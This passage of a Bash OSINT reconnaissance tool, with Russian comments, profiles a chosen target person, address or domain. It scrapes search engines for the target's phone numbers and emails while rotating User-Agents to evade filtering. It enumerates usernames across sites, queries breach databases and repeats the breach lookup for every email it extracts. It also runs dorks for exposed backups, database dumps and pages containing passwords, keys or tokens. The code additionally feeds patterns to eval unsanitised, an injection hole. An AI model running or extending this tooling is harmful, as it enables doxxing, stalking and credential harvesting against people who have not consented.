    ' >> "$tmp_delta"

    # --- СЛОЙ АТОМАРНОЙ ФИКСАЦИИ В МОНОЛИТЕ ---
    if [[ -s "$tmp_delta" ]]; then
        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_HISTORICAL_DELTA_REPORT | COMPARED WITH: $(basename "$last_log")"
            echo "=============================================================================="
            cat "$tmp_delta"
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "s" "Delta-Engine: Infrastructure mutations identified and appended to log."
    else
        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_HISTORICAL_DELTA_REPORT | NO CHANGES DETECTED SINCE LAST SCAN"
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "i" "Delta-Engine: Target infrastructure is identical to historical baseline."
    fi

    # Санитарная очистка сессионных следов
    rm -f "$tmp_delta"
}


# ==============================================================================
# @description: OSINT NEXUS v20.0 - ULTIMATE DEEP SIGNATURE PROCESSOR
# МОДЕРНИЗАЦИЯ: Потоковая изоляция спецсимволов, экстракция форензик-контекста
# АРХИТЕКТУРА: Ghost-Speed Engine, RAM-токенизация через IFS, Zero-Disk IO
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | ABSOLUTE SYSTEM LIMIT
# ==============================================================================
osint_categorize_target() {
    # Полный контроль контекста окружения
    [[ -z "$raw_log" || ! -f "$raw_log" || ! -r "$raw_log" ]] && return 1

    core_engine_ui "i" "Nexus-Processor: Launching high-velocity multi-token signature extraction..."

    # Однопроходное зеркалирование лога в RAM-буфер (Защита от избыточного I/O диска)
    local log_buffer
    log_buffer=$(cat "$raw_log" 2>/dev/null)
    [[ -z "$log_buffer" ]] && return 0

    # Создание изолированного сессионного буфера для генерации структурированного отчета
    local tmp_report="/tmp/nexus_signatures_$$"
    touch "$tmp_report"
    
    local total_matches=0

    # --- СЛОЙ ДИНАМИЧЕСКОЙ ТОКЕНИЗАЦИИ МАТРИЦЫ ---
    for entry in "${GLOBAL_INFRA_SIGNATURES[@]}"; do
        [[ -z "$entry" || "$entry" != *"|"* ]] && continue
        
        # Нативное отделение описания категории (последний элемент за последним пайпом)
        local target_desc="${entry##*|}"
        local patterns_string="${entry%|*}"
        
        # Безопасное разделение строки паттернов на независимые токены через локальный IFS
        local saved_ifs="$IFS"
        IFS='|'
        local sub_patterns
        read -r -a sub_patterns <<< "$patterns_string"
        IFS="$saved_ifs"
        
        local tech_matched=0
        local tmp_tech_log="/tmp/nexus_subtech_$$"
        touch "$tmp_tech_log"

        # Сканируем каждый токен отдельно с защитой от спецсимволов
        for pattern in "${sub_patterns[@]}"; do
            [[ -z "$pattern" ]] && continue
            
            # Используем grep -F (Fixed Strings) для токенов со спецсимволами вроде ga('create')
            # Если токен алфавитно-цифровой, используем grep -E с границами слов \b для исключения ложных срабатываний
            local search_cmd="grep -qiF"
            if [[ "$pattern" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                search_cmd="grep -qiE \b${pattern}\b"
            else
                search_cmd="grep -qiF $pattern"
            fi
            
            # Проверка наличия сигнатуры в кэше оперативной памяти
            if echo "$log_buffer" | eval "$search_cmd" 2>/dev/null; then
                # Экстракция первой уникальной строки из лога, содержащей данный маркер (Форензик-Контекст)
                local context_line
                if [[ "$pattern" =~ ^[a-zA-Z0-9_-]+$ ]]; then
                    context_line=$(echo "$log_buffer" | grep -iE "\b${pattern}\b" | head -n 1 | xargs)
                else
                    context_line=$(echo "$log_buffer" | grep -iF "$pattern" | head -n 1 | xargs)
                fi
                
                # Нативное ограничение длины строки контекста во избежание деформации структуры интерфейса
                if (( ${#context_line} > 95 )); then
                    context_line="${context_line:0:92}..."
                fi
                
                echo "   -> [TOKEN]: '$pattern' | CONTEXT: \"$context_line\"" >> "$tmp_tech_log"
                tech_matched=1
            fi
        done

        # Если технологический слой подтвержден, упаковываем блок данных в системный пул
        if (( tech_matched == 1 )); then
            ((total_matches++))
            echo "[+] LAYER DETECTED: $target_desc" >> "$tmp_report"
            cat "$tmp_tech_log" >> "$tmp_report"
            echo "" >> "$tmp_report"
        fi
        rm -f "$tmp_tech_log"
    done

    # --- СЛОЙ ПУБЛИКАЦИИ И ФИКСАЦИИ В МОНОЛИТЕ ---
    if (( total_matches > 0 )); then
        {
            echo -e "\n"
            echo "=============================================================================="
            echo " @CORE_INFRA_MATCH_REPORT | TIMESTAMP: $(date '+%Y-%m-%d %H:%M:%S')"
            echo "=============================================================================="
            cat "$tmp_report"
            echo "=============================================================================="
        } >> "$raw_log"
        
        core_engine_ui "s" "Nexus-Processor: Successfully mapped $total_matches infrastructure layers."
    else
        core_engine_ui "i" "Nexus-Processor: No infrastructure layers detected in active buffer."
    fi

    # Очистка дескрипторов временных файлов текущей сессии процесса
    rm -f "$tmp_report"
}

# ==============================================================================
# @description: OSINT NEXUS v21.0 - CORE LEXICAL ROUTER [MONOLITH CONTROL]
# МОДЕРНИЗАЦИЯ: Интеграция с GLOBAL_INFRA_MATRIX, GLOBAL_EMAIL_MATRIX, GLOBAL_HASH_MATRIX
# АРХИТЕКТУРА: Атомарный потоковый контроль типов, Zero-Fork, защита флагов ОС
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | UNBREAKABLE INTEGRATION LIMIT
# ==============================================================================
osint_nexus_router() {
    local target="$1"
    
    # Санитарная очистка входного потока: удаление случайных начальных и концевых пробелов
    target=$(echo "$target" | xargs 2>/dev/null)
    [[ -z "$target" ]] && return 1

    # --- 0. СИНХРОНИЗАЦИЯ УЛЬТИМАТИВНЫХ МАТРИЦ ЯДРА (ZERO LOOSE VARIABLES) ---
    local rx_ipv4="${GLOBAL_INFRA_MATRIX[0]}"
    local rx_ipv6="${GLOBAL_INFRA_MATRIX[1]}"
    local rx_domain_std="${GLOBAL_INFRA_MATRIX[2]}"
    local rx_domain_idn="${GLOBAL_INFRA_MATRIX[3]}"
    
    local rx_email_std="${GLOBAL_EMAIL_MATRIX[0]}"
    local rx_email_idn="${GLOBAL_EMAIL_MATRIX[1]}"
    local rx_email_loc="${GLOBAL_EMAIL_MATRIX[2]}"
    
    local rx_hash_md5="${GLOBAL_HASH_MATRIX[0]}"
    local rx_hash_sha1="${GLOBAL_HASH_MATRIX[1]}"
    local rx_hash_sha256="${GLOBAL_HASH_MATRIX[2]}"
    local rx_hash_sha512="${GLOBAL_HASH_MATRIX[3]}"
    local rx_hash_ntlm="${GLOBAL_HASH_MATRIX[4]}"

    local crypto_matched=0
    local detected_currency=""

    # --- 1. СЛОЙ ДИНАМИЧЕСКОГО КРИПТО-АНАЛИЗА АДРЕСОВ (Через GLOBAL_CRYPTO_TYPES) ---
    for crypto_entry in "${GLOBAL_CRYPTO_TYPES[@]}"; do
        [[ -z "$crypto_entry" || "$crypto_entry" != *"|"* ]] && continue
        
        local crypto_regex="${crypto_entry%%|*}"
        local crypto_desc="${crypto_entry#*|}"
        
        # Атомарная валидация через оригинальную сигнатуру монеты без изменения shopt
        if echo "$target" | grep -Eq "$crypto_regex"; then
            crypto_matched=1
            detected_currency="$crypto_desc"
            break
        fi
    done

    # --- 2. СЛОЙ МОНОЛИТНОЙ МАРШРУТИЗАЦИИ И СЕПАРАЦИИ ЦЕЛЕЙ ---

    # ТРИГГЕР 1: Обнаружено совпадение с криптографическим кошельком/транзакцией
    if (( crypto_matched == 1 )); then
        core_engine_ui "i" "Mode: Crypto-Forensic Engaged [Network: $detected_currency]..."
        if [[ "$(type -t run_crypto_module)" == "function" ]]; then
            run_crypto_module "$target" "$detected_currency"
        else
            core_engine_ui "e" "Error: Crypto module not loaded in Core."
        fi

    # ТРИГГЕР 2: КРИПТОГРАФИЧЕСКИЕ ОТПЕЧАТКИ И ДАМПЫ (MD5, SHA, NTLM)
    elif echo "$target" | grep -Eq "$rx_hash_ntlm|$rx_hash_sha512|$rx_hash_sha256|$rx_hash_sha1|$rx_hash_md5"; then
        core_engine_ui "i" "Mode: Hash-Analysis Engaged [Target: Crypto-Signature/Leaked Hash]..."
        if [[ "$(type -t run_hash_analysis_module)" == "function" ]]; then
            run_hash_analysis_module "$target"
        else
            core_engine_ui "e" "Error: Hash-Analysis module not loaded in Core."
        fi

    # ТРИГГЕР 3: КОРПОРАТИВНАЯ ИНФРАСТРУКТУРА (Многослойный сетевой контур IP, Доменов и Email)
    elif echo "$target" | grep -Eqi "$rx_ipv4" || \
         echo "$target" | grep -Eqi "$rx_ipv6" || \
         echo "$target" | grep -Eqi "$rx_domain_std" || \
         echo "$target" | grep -Eqi "$rx_domain_idn" || \
         echo "$target" | grep -Eqi "$rx_email_std" || \
         echo "$target" | grep -Eqi "$rx_email_idn" || \
         echo "$target" | grep -Eqi "$rx_email_loc"; then
        
        core_engine_ui "i" "Mode: Corporate-Recon Engaged [Target: Infrastructure Cluster]..."
        if [[ "$(type -t run_corp_recon_module)" == "function" ]]; then
            run_corp_recon_module "$target"
        else
            core_engine_ui "e" "Error: Corporate-Recon module not loaded in Core."
        fi

    # ТРИГГЕР 4: СОЦИАЛЬНЫЕ СВЯЗИ / АНАЛИЗ ИДЕНТИЧНОСТИ (Никнеймы и дескрипторы)
    elif [[ "$target" =~ ^@[a-zA-Z0-9_]{3,32}$ ]] || [[ "$target" =~ ^[a-zA-Z0-9_-]{3,32}$ ]]; then
        local clean_nick="${target#@}"
        
        core_engine_ui "i" "Mode: Social-Graph Engaged [Target: Identity Node]..."
        if [[ "$(type -t run_social_graph_module)" == "function" ]]; then
            run_social_graph_module "$clean_nick"
        else
            core_engine_ui "e" "Error: Social-Graph module not loaded in Core."
        fi

    # ТРИГГЕР 5: Резервный отказоустойчивый обработчик
    else
        core_engine_ui "w" "Warning: Unrecognized target vector. Defaulting to Corporate-Recon..."
        if [[ "$(type -t run_corp_recon_module)" == "function" ]]; then
            run_corp_recon_module "$target"
        else
            core_engine_ui "e" "Error: Critical routing failure. Fallback module missing."
        fi
    fi
}

# ==============================================================================
# @description: OSINT NEXUS v16.2 - BREACH LEAKS INTERNAL ENGINE
# МОДЕРНИЗАЦИЯ: Досрочное прерывание потока I/O, нативная фильтрация бинарных данных
# АРХИТЕКТУРА: Ghost-Speed Engine, RAM-дедупликация, динамическая привязка к PRIME_LOOT
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | ABSOLUTE TEXT LIMIT
# ==============================================================================
run_osint_custom_leaks() {
    local clean_target="$1"
    [[ -z "$clean_target" ]] && return 1

    # Полная привязка к твоей глобальной экосистеме путей
    local target_loot="${PRIME_LOOT:-$HOME/prime_loot}"
    
    # Формируем массив поиска, используя актуальные глобальные векторы ядра
    local search_dirs=("$HOME/arsenal_loot" "$target_loot" "$HOME/reports")
    
    # Внутренний лимит вывода строк для сохранения отзывчивости интерфейса
    local max_lines=50

    for dir in "${search_dirs[@]}"; do
        # Нативная пред-проверка существования и доступности директории на чтение
        [[ ! -d "$dir" || ! -r "$dir" ]] && continue
        
        # --- СЛОЙ ВЫСОКОСКОРОСТНОГО СТРИМИНГА С ДОСРОЧНЫМ ПРЕРЫВАНИЕМ ---
        # -r  - рекурсивно
        # -i  - регистронезависимо
        # -h  - скрывать имена файлов в выводе (чистый лог)
        # -I  - игнорировать бинарные файлы (защита от зависания на zip/tar/sqlite)
        # --mmap - использовать проецирование памяти для ускорения чтения больших файлов (если поддерживается)
        
        grep -rihI --mmap "$clean_target" "$dir" 2>/dev/null | \
        grep -v "LOCAL BREACH SEARCH REPORT" | \
        awk '!visited[$0]++' | \
        head -n "$max_lines"
        
        # Инженерное примечание: 'awk '!visited[$0]++'' производит дедупликацию строк 
        # в оперативной памяти "на лету" без тяжелой сортировки всей базы данных через 'sort -u'.
    done
}

# ==============================================================================
# @description: OSINT NEXUS v21.0 - OMNI-CRAWLER INTERNAL PARSER (PRIME INTEGRATION)
# МОДЕРНИЗАЦИЯ: Полный переход на поисковый реестр GLOBAL_PRIME_MATRIX v2.0
# АРХИТЕКТУРА: Ghost-Speed Engine, неблокирующее скользящее окно, RAM-дедупликация
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | INTEGRATION LIMIT
# ==============================================================================
run_osint_omni_crawler() {
    local target_user="$1"
    
    # Защита контекста среды: входной вектор обязано быть инициализирован
    [[ -z "$target_user" ]] && return 1

    core_engine_ui "i" "Omni-Crawler: Launching parallel search matrix v21.0 [PRIME REGISTRY]..."

    # --- 0. СИНХРОНИЗАЦИЯ УЛЬТИМАТИВНЫХ МАТРИЦ ЯДРА (ZERO LOOSE VARIABLES) ---
    # Извлечение сигнатур электронной почты
    local rx_email_std="${GLOBAL_EMAIL_MATRIX[0]}"
    local rx_email_idn="${GLOBAL_EMAIL_MATRIX[1]}"
    local rx_email_loc="${GLOBAL_EMAIL_MATRIX[2]}"
    
    # Нативный слайсинг модернизированной матрицы телефонов GLOBAL_PRIME_MATRIX
    local rx_phone_intl="${GLOBAL_PRIME_MATRIX[0]}"
    local rx_phone_brackets="${GLOBAL_PRIME_MATRIX[1]}"
    local rx_phone_cis="${GLOBAL_PRIME_MATRIX[2]}"
    local rx_phone_compact="${GLOBAL_PRIME_MATRIX[3]}"

    # Нативное URL-кодирование пробелов: подготовка вектора под веб-запросы
    local safe_target="${target_user// /+}"
    local query_vectors=("${safe_target}+phone" "${safe_target}+contact" "${safe_target}+gmail")
    
    # Изолированные сессионные буферы для предотвращения Race Condition (PID-изоляция на уровне I/O)
    local tmp_phones="/tmp/nexus_phones_$$"
    local tmp_emails="/tmp/nexus_emails_$$"
    touch "$tmp_phones" "$tmp_emails"

    local max_parallel_jobs=12 # Ограничитель пула одновременных сокетов ядра в скользящем окне

    # --- 1. СЛОЙ ПАРАЛЛЕЛЬНОЙ АГРЕГАЦИИ (АСИНХРОННЫЙ КРАУЛИНГ) ---
    for vector in "${query_vectors[@]}"; do
        for engine_entry in "${GLOBAL_SEARCH_ENGINES[@]}"; do
            [[ -z "$engine_entry" || "$engine_entry" != *"|"* ]] && continue
            
            local engine_name="${engine_entry%%|*}"
            local request_url="${engine_entry#*|}"
            request_url="${request_url//%VECTOR%/$vector}"
            
            # Динамический выбор случайного User-Agent из глобального массива для обхода WAF/Фильтров
            local selected_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            if [[ -n "${GLOBAL_NETWORK_UA[*]}" ]]; then
                selected_ua=$(shuf -n1 -e "${GLOBAL_NETWORK_UA[@]}")
            fi
            
            # Асинхронный Ghost-поток: полная сетевая изоляция сокета в фоне
            (
                # curl-сессия с жестким контролем времени жизни дескрипторов сокетов
                local raw_data
                raw_data=$(curl -s -L -A "$selected_ua" \
                    --connect-timeout 4 \
                    --max-time 10 \
                    "$request_url" 2>/dev/null)
                
                if [[ -n "$raw_data" ]]; then
                    # Каскадный однопроходный парсинг телефонов по всей матрице GLOBAL_PRIME_MATRIX
                    echo "$raw_data" | grep -oE "$rx_phone_intl|$rx_phone_brackets|$rx_phone_cis|$rx_phone_compact" >> "$tmp_phones" 2>/dev/null
                    
                    # Каскадный однопроходный парсинг почтовых аккаунтов по всей матрице GLOBAL_EMAIL_MATRIX
                    echo "$raw_data" | grep -oE "$rx_email_std|$rx_email_idn|$rx_email_loc" >> "$tmp_emails" 2>/dev/null
                fi
            ) &
            
            # --- УЛЬТИМАТИВНЫЙ КОНТРОЛЛЕР СКОЛЬЗЯЩЕГО ОКНА (SLIDING WINDOW POOL) ---
            # Удерживаем пул активным строго на 12 параллельных процессов.
            # Освободившийся PID мгновенно замещается следующим элементом цикла.
            while (( $(jobs -p | wc -l) >= max_parallel_jobs )); do
                sleep 0.02 # Микропауза ядра Linux для снижения нагрузки на планировщик до 0%
            done
        done
    done
    wait # Глобальный барьер синхронизации: удерживаем ядро до завершения последней фоновой задачи
    
    # --- 2. СЛОЙ РЕГИСТРОНЕЗАВИСИМОЙ RAM-ДЕДУПЛИКАЦИИ И СТРИМИНГА ---
    if [[ -s "$tmp_phones" ]]; then
        # Потоковая очистка дубликатов номеров
        awk '!visited[$0]++' "$tmp_phones" >> "/tmp/nexus_found_phones.tmp" 2>/dev/null
    fi
    
    if [[ -s "$tmp_emails" ]]; then
        # Приведение к нижнему регистру перед дедупликацией для исключения повторов USER@ и user@
        awk '!visited[tolower($0)]++' "$tmp_emails" >> "/tmp/nexus_found_emails.tmp" 2>/dev/null
    fi

    # Сбор метрик для передачи в системный интерфейс оператора
    local found_p=0
    local found_e=0
    [[ -f "/tmp/nexus_found_phones.tmp" ]] && found_p=$(wc -l < "/tmp/nexus_found_phones.tmp")
    [[ -f "/tmp/nexus_found_emails.tmp" ]] && found_e=$(wc -l < "/tmp/nexus_found_emails.tmp")

    core_engine_ui "s" "Omni-Crawler: Extraction complete. Consolidated metrics: Phones ($found_p), Emails ($found_e)."

    # Тотальная санитарная зачистка изолированных временных файлов текущей сессии PID
    rm -f "$tmp_phones" "$tmp_emails"
}


# ==============================================================================
# @description: OSINT NEXUS v24.0 - UNIVERSAL FILE DISCOVERY ENGINE
# МОДЕРНИЗАЦИЯ: Полная матрица расширений, динамический URI-билдинг
# ==============================================================================
run_osint_dorking_engine() {
    local target="$1"
    local raw_log="$2"
    
    core_engine_ui "i" "Dorking Engine: Initiating universal file-discovery for $target..."

    # Матрица форматов (Архивы, Документы, Данные, Конфигурации)
    local extensions=("pdf" "doc" "docx" "xls" "xlsx" "csv" "txt" "log" "bak" "sql" "db" "json" "xml" "zip" "tar" "gz" "cfg" "conf")
    
    # Генерация поискового вектора для всех форматов сразу
    local file_dork="filetype:$(IFS='|'; echo "${extensions[*]}") \"$target\""

    local dorks=(
        "$file_dork"
        "intitle:index.of \"$target\""
        "intext:\"$target\" AND \"password\" OR \"key\" OR \"token\""
        "site:pastebin.com \"$target\""
        "site:github.com \"$target\""
        "inurl:backup \"$target\""
    )

    for dork in "${dorks[@]}"; do
        local gateway=$(shuf -n1 -e "${GLOBAL_FALLBACK_SEARCH_GATES[@]}")
        
        # Интеллектуальная адаптация URL-параметра (поддержка q=, p=, query=)
        local query_param="q="
        [[ "$gateway" == *"yahoo"* ]] && query_param="p="
        
        local encoded_dork=$(echo "$dork" | jq -sRr @uri)
        local query="${gateway%%=*}=${encoded_dork}" # Динамическая сборка URL
        
        echo "[DORK_QUERY] Gateway: $gateway | Dork: $dork" >> "$raw_log"
        
        local selected_ua=$(shuf -n1 -e "${GLOBAL_NETWORK_UA[@]}")
        local results=$(curl -s -L -A "$selected_ua" --connect-timeout 5 "$query" 2>/dev/null)
        
        # Парсинг с исключением технических узлов поисковиков
        echo "$results" | grep -oP 'https://[^"]+' | \
        grep -vE "google|bing|yahoo|ask|duckduckgo" | \
        grep -E "\.($(IFS='|'; echo "${extensions[*]}"))" | \
        awk '!visited[$0]++' | \
        head -n 8 >> "$raw_log"
        
        sleep 1.0
    done
    
    core_engine_ui "s" "Universal file discovery complete. All vectors mapped."
}

# Пример функции для анализа метаданных найденных файлов
run_osint_metadata_analyzer() {
    local file="$1"
    core_engine_ui "i" "Nexus: Analyzing metadata for $file..."
    
    if command -v exiftool >/dev/null 2>&1; then
        exiftool -json "$file" >> "${file}.meta.json"
        # Интеграция в лог
        echo "[METADATA_ANALYSIS] $(cat ${file}.meta.json)" >> "$raw_log"
    fi
}


# --- 7. [NEW] DELTA INTELLIGENCE MONITOR ---
# Функция сравнения текущего лога с предыдущим (хранится в базе)
run_osint_delta_monitor() {
    local target="$1"
    local new_log="$2"
    local history_dir="$loot_dir/history"
    mkdir -p "$history_dir"
    
    local last_log=$(ls -t "$history_dir/${target}_"*.log 2>/dev/null | head -n1)
    
    if [[ -n "$last_log" ]]; then
        core_engine_ui "i" "Nexus: Detecting changes since last scan..."
        local diff_report="$loot_dir/delta_${target}_$(date +%Y%m%d).txt"
        
        # Сравниваем файлы и вытаскиваем только новые уникальные строки
        comm -13 <(sort "$last_log") <(sort "$new_log") > "$diff_report"
        
        if [[ -s "$diff_report" ]]; then
            core_engine_ui "e" "NEW INTELLIGENCE DETECTED! Check $diff_report"
        else
            core_engine_ui "s" "No new intelligence detected."
        fi
    fi
    
    # Копируем текущий лог в историю как последний
    cp "$new_log" "$history_dir/${target}_$(date +%Y%m%d_%H%M%S).log"
}

# --- 8. [NEW] FILE FORENSICS PIPELINE ---
run_osint_forensics() {
    local file_list="$1"
    core_engine_ui "i" "Nexus: Deep-diving into extracted file metadata..."
    
    while read -r file_path; do
        if [[ -f "$file_path" ]]; then
            # Извлечение автора, даты создания и геолокации (если есть)
            exiftool -j "$file_path" > "${file_path}.json"
            # Добавляем инфо в общий лог
            echo "[FILE_META] $file_path -> $(cat ${file_path}.json)" >> "$raw_log"
        fi
    done < "$file_list"
}

# ==============================================================================
# @description: OSINT NEXUS v21.0 - FULL RECURSIVE MONOLITH (MAX INTEGRATION)
# МОДЕРНИЗАЦИЯ: Сквозная интеграция GLOBAL_INFRA, EMAIL, PRIME и FILTER_MATRIX (Ь)
# АРХИТЕКТУРА: Sliding Window Parallel Pool, RAM-дедупликация, Zero-Fork рекурсия
# @status: GHOST-SPEED COMPLIANT | MAXIMUM INTEGRATION LIMIT | FULL VECTOR
# ==============================================================================
run_smart_osint_engine() {
    clear
    core_engine_ui "h" "PRIME RECON: NEXUS v21.0 (RECURSIVE MONOLITH)"

    local TARGET
    TARGET=$(core_engine_input "text" "TARGET (Nick, Name, Phone, Email, IP, or Domain)")
    [[ -z "$TARGET" ]] && return

    # Нативное экранирование спецсимволов для безопасных файловых и директорных операций
    local timestamp
    timestamp=$(date +%Y%m%d_%H%M%S)
    local safe_target="${TARGET//[^a-zA-Z0-9]/_}"
    
    # Унификация путей под строгий системный стандарт изолированного хранения данных
    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
    mkdir -p "$loot_dir" 2>/dev/null
    
    local raw_log="$loot_dir/forensic_${safe_target}_$timestamp.log"
    export target_user="$TARGET" 
    
    echo "[*] RECURSIVE SCAN STARTED: $TARGET | TIMESTAMP: $(date)" > "$raw_log"

    # --- 0. СИНХРОНИЗАЦИЯ УЛЬТИМАТИВНЫХ МАТРИЦ ЯДРА (ZERO LOOSE VARIABLES) ---
    local rx_ipv4="${GLOBAL_INFRA_MATRIX[0]}"
    local rx_ipv6="${GLOBAL_INFRA_MATRIX[1]}"
    local rx_domain_std="${GLOBAL_INFRA_MATRIX[2]}"
    local rx_domain_idn="${GLOBAL_INFRA_MATRIX[3]}"
    
    local rx_email_std="${GLOBAL_EMAIL_MATRIX[0]}"
    local rx_email_idn="${GLOBAL_EMAIL_MATRIX[1]}"
    local rx_email_loc="${GLOBAL_EMAIL_MATRIX[2]}"
    
    local rx_phone_intl="${GLOBAL_PRIME_MATRIX[0]}"
    local rx_phone_brackets="${GLOBAL_PRIME_MATRIX[1]}"
    local rx_phone_cis="${GLOBAL_PRIME_MATRIX[2]}"
    local rx_phone_compact="${GLOBAL_PRIME_MATRIX[3]}"

    # Динамический выбор случайного User-Agent из ядра для защиты от сетевой блокировки
    local selected_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    if [[ -n "${GLOBAL_NETWORK_UA[*]}" ]]; then
        selected_ua=$(shuf -n1 -e "${GLOBAL_NETWORK_UA[@]}")
    fi

    # --- 1. КРИТИЧЕСКИЙ ФИЛЬТР СЕПАРАЦИИ ЦЕЛЕЙ (SOCIAL SCAN SWITCH) ---
    # Проверяем, является ли цель сетевым или инфраструктурным идентификатором
    if ! echo "$TARGET" | grep -Eq "$rx_email_std|$rx_email_idn|$rx_phone_intl|$rx_phone_cis|$rx_ipv4|$rx_ipv6|$rx_domain_std"; then
        core_engine_ui "i" "Scanning Social Signatures (Ghost Parallel Mode)..."
        
        # Атомарный изолированный буфер для параллельных потоков сбора
        local tmp_social="/tmp/osint_social_$$"
        touch "$tmp_social"

        local max_parallel_jobs=10  # Защитный лимит одновременных сетевых сокетов

        for entry in "${GLOBAL_OSINT_SITES[@]}"; do
            [[ -z "$entry" || "$entry" != *"|"* ]] && continue
            local url="${entry%%|*}"
            local name="${entry#*|}"
            
            # Асинхронное распараллеливание curl под контролем неблокирующего пула
            (
                local resp
                resp=$(curl -s -L -A "$selected_ua" -I "${url}${TARGET}" --connect-timeout 4 2>/dev/null)
                if echo "$resp" | grep -Eqi "HTTP/[12.]+ 200"; then
                    echo "[MATCH] $name -> ${url}${TARGET}" >> "$tmp_social"
                fi
            ) &
            
            # --- УЛЬТИМАТИВНЫЙ КОНТРОЛЛЕР СКОЛЬЗЯЩЕГО ОКНА (SLIDING WINDOW) ---
            while (( $(jobs -p | wc -l) >= max_parallel_jobs )); do
                sleep 0.02
            done
        done
        wait # Фиксация и дожидание остаточных фоновых потоков
        
        [[ -s "$tmp_social" ]] && cat "$tmp_social" >> "$raw_log"
        rm -f "$tmp_social"

        # Запрос метаданных к первой ноде идентификации из глобального пула API
        if [[ -n "${GLOBAL_API_IDENTITY_NODES[0]}" ]]; then
            local gh_api="${GLOBAL_API_IDENTITY_NODES[0]%%|*}"
            curl -s -A "$selected_ua" "${gh_api}${TARGET}" >> "$raw_log" 2>/dev/null
        fi
    fi

    # --- 2. ТЕХНИЧЕСКИЙ ПИПЛАЙН ВЫСОКОГО УРОВНЯ (Deep Intel Ноды) ---
    core_engine_ui "i" "Running primary technical pipeline v21.0..."
    
    # Интеграция телефонных нод API (Проверка по всей матрице PRIME)
    if echo "$TARGET" | grep -Eq "$rx_phone_intl|$rx_phone_brackets|$rx_phone_cis|$rx_phone_compact"; then
        if [[ -n "${GLOBAL_API_PHONE_NODES[0]}" ]]; then
            echo -e "\n[PHONE_DATA]" >> "$raw_log"
            curl -s -A "$selected_ua" "${GLOBAL_API_PHONE_NODES[0]%%|*}$TARGET" >> "$raw_log" 2>&1
        fi
    fi
    
    # Интеграция нод анализа утечек данных (Breach Nodes)
    if echo "$TARGET" | grep -Eq "$rx_email_std|$rx_email_idn|$rx_email_loc"; then
        if [[ -n "${GLOBAL_API_BREACH_NODES[0]}" ]]; then
            echo -e "\n[BREACH_DATA]" >> "$raw_log"
            curl -s -A "$selected_ua" "${GLOBAL_API_BREACH_NODES[0]%%|*}$TARGET" >> "$raw_log" 2>&1
        fi
    fi
    
    # Интеграция сетевых нод маршрутизации (IP Nodes - IPv4 / IPv6)
    if echo "$TARGET" | grep -Eq "$rx_ipv4|$rx_ipv6"; then
        if [[ -n "${GLOBAL_API_NETWORK_NODES[0]}" ]]; then
            echo -e "\n[NET_DATA]" >> "$raw_log"
            curl -s -A "$selected_ua" "${GLOBAL_API_NETWORK_NODES[0]%%|*}$TARGET/json" >> "$raw_log" 2>&1
        fi
    fi
    
    # Интеграция доменного инфраструктурного анализа и SSL-метрики
    if echo "$TARGET" | grep -Eq "$rx_domain_std|$rx_domain_idn"; then
        echo -e "\n[DNS_DATA]" >> "$raw_log"
        if command -v dig >/dev/null 2>&1; then
            dig +noall +answer "$TARGET" >> "$raw_log"
        else
            nslookup "$TARGET" >> "$raw_log" 2>&1
        fi
        
        echo -e "\n[SSL_DATA]" >> "$raw_log"
        if command -v openssl >/dev/null 2>&1; then
            echo | openssl s_client -servername "$TARGET" -connect "$TARGET:443" 2>/dev/null | \
            openssl x509 -noout -subject -dates >> "$raw_log" 2>&1
        fi
    fi

    # --- 3. АВТОМАТИЗИРОВАННОЕ РАСШИРЕНИЕ КОНТУРА КРАУЛИНГА ---
    core_engine_ui "i" "Nexus: Running Automated Pipeline Extensions..."
    [[ "$(type -t run_osint_omni_crawler)" == "function" ]] && run_osint_omni_crawler "$TARGET" "$raw_log"
    [[ "$(type -t run_osint_custom_socialscan)" == "function" ]] && run_osint_custom_socialscan "$TARGET" "$raw_log"
    [[ "$(type -t run_osint_custom_leaks)" == "function" ]] && run_osint_custom_leaks "$TARGET" "$raw_log"
    [[ "$(type -t run_osint_dorking_engine)" == "function" ]] && run_osint_dorking_engine "$TARGET" "$raw_log"
    [[ "$(type -t run_osint_delta_monitor)" == "function" ]] && run_osint_delta_monitor "$TARGET" "$raw_log"
    
    if echo "$TARGET" | grep -Eq "$rx_phone_intl|$rx_phone_cis" && [[ "$(type -t run_osint_custom_ignorant)" == "function" ]]; then
        run_osint_custom_ignorant "$TARGET" "$raw_log"
    fi

    # --- 4. РЕКУРСИВНЫЙ ЦИКЛ (Deep-Hunt Стриминг Извлеченных Сущностей) ---
    core_engine_ui "i" "Nexus: Launching recursive search on extracted entities..."
    
    # Допустим, мы извлекаем пути к файлам из лога
    local found_files_list="/tmp/files_$$"
    grep -oE "https?://[^\"]+\.(pdf|docx?|xlsx?|sql|log)" "$raw_log" | sort -u > "$found_files_list"
    if [[ -s "$found_files_list" ]]; then
        run_osint_forensics "$found_files_list"
    fi
    rm -f "$found_files_list"
    
    # 4.1 Потоковая дедуплицированная рекурсия по Email (Чистый RAM-пайплайн)
    local ext_emails
    ext_emails=$(grep -oEoi "$rx_email_std|$rx_email_idn" "$raw_log" 2>/dev/null | awk '!visited[tolower($0)]++')
    if [[ -n "$ext_emails" && -n "${GLOBAL_API_BREACH_NODES[0]}" ]]; then
        local breach_api="${GLOBAL_API_BREACH_NODES[0]%%|*}"
        echo "$ext_emails" | while read -r email; do
            [[ -z "$email" ]] && continue
            echo "[RECURSIVE_BREACH_CHECK] $email" >> "$raw_log"
            curl -s -A "$selected_ua" "${breach_api}$email" >> "$raw_log" 2>&1
        done
    fi

    # 4.2 Потоковая дедуплицированная рекурсия по сетевым IP-адресам (Исправленный синтаксис)
    local ext_ips
    ext_ips=$(grep -oE "$rx_ipv4" "$raw_log" 2>/dev/null | awk '!visited[$0]++')
    if [[ -n "$ext_ips" && -n "${GLOBAL_API_NETWORK_NODES[0]}" ]]; then
        local net_api="${GLOBAL_API_NETWORK_NODES[0]%%|*}"
        echo "$ext_ips" | while read -r ip; do
            [[ -z "$ip" ]] && continue
